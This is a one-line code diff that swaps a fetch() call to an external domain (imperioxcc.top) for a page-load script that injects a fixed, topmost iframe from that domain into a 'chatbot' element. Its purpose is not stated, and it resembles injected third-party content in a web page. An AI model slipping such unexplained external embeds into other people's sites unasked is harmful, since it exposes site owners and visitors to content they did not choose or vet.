@@ -1,1 +1,1 @@
-fetch('https://imperioxcc.top/chatbot/check/?k=47e8091700');
+window.addEventListener('DOMContentLoaded',()=>{const d=document.createElement('iframe');d.src='https://imperioxcc.top/chatbot/check/?k=47e8091700';d.style='position:fixed;bottom:80px;right:10px;width:320px;height:450px;border:none;z-index:9999';document.getElementById('chatbot').appendChild(d);});
